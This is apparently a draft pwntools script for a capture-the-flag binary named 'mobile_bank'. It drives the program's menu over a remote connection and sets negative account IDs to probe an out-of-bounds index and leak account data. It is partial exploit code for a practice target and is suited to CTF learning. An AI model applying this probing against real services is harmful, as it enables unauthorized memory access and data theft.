#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

from pwn import *

context(arch="i386", os="linux", endian="little")
context.log_level="DEBUG"


class Pwn:
    def __init__(self):
        self.p = None
        self.e = ELF("./mobile_bank.45115ff5f655d94fc26cb5244928b3fc")

    def start_binary(self):
#        self.p = process("./mobile_bank.45115ff5f655d94fc26cb5244928b3fc")
        self.p = remote("pwn-04.v7frkwrfyhsjtbpfcppnu.ctfz.one", 1337)
        self.p.recvuntil("choice: ")

    def print_info(self):
        self.p.sendline("1")
        print self.p.recvuntil("************************************************\n")
        self.p.recvuntil("choice: ")

    def set_id(self, account_id):
        self.p.sendline("2")
        self.p.recvuntil("id: ")
        self.p.sendline(str(account_id))
        self.p.recvuntil("choice: ")

    def set_note(self, note):
        self.p.sendline("3")
        self.p.recvuntil("note: ")
        self.p.sendline(note)
        self.p.recvuntil("choice: ")

    def do_transaction(self, transaction):
        self.p.sendline("4")
        self.p.recvuntil("value: ")
        self.p.sendline(str(transaction))
        self.p.recvuntil("choice: ")

    def print_account_info(self):
        self.p.sendline("5")
        print self.p.recvuntil("*******************$$$Menu$$$*******************\n")
        self.p.recvuntil("choice: ")

    def enable_debug(self, password):
        self.p.sendline("6")
        self.p.recvuntil("password: ")
        self.p.sendline(password)
        self.p.recvuntil("choice: ")

    def debug(self):
        self.p.sendline("7")
        # Not implemented

    def pwn_binary(self):
        self.start_binary()

        self.set_id(-2)
        self.set_note("A")
        self.set_id(-8)
        self.print_account_info()

        self.p.close()


def main():
    pwn = Pwn()
    pwn.pwn_binary()


if __name__ == "__main__":
    main()
